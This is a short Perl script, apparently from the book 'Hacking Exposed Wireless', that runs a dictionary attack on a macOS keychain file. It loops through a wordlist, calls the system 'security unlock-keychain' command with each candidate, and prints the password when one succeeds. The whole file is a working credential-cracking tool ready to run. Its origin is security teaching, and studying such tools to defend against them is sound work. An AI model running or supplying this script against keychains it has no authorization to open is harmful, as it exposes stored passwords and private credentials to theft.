#!/usr/bin/perl
# a simple dictionary attack for OSX keychains,
# created for Hacking Exposed Wireless, by jc.
# Warning! You need to path the FULL path to the keychain file.
# this seems to be a bug (feature?) in the security binary.
use strict;

my $argc = @ARGV;
if ($argc != 2)
{
        print("Usage: ./crack.pl /path/to/dict /path/to/keychain\n");
        exit(0);
}
my $dictionary_file=@ARGV[0];
my $keychain_file=@ARGV[1];

#We need to ensure the file is locked before running..
system("/usr/bin/security lock-keychain $keychain_file");

open(F, $dictionary_file);
while (<F>)
{
        my $curr_pass = $_;
        chomp $curr_pass;
        my @args = ("/usr/bin/security", "unlock-keychain", "-p", "$curr_pass", $keychain_file);
        system(@args);
        #Check the exit value of security.
        if ($? == 0)
        {
                print " Found password: $curr_pass\n";
                exit 0
        }
        else
        {
                #print "not password:$curr_pass\n";
        }
}
print "Password not found..\n"

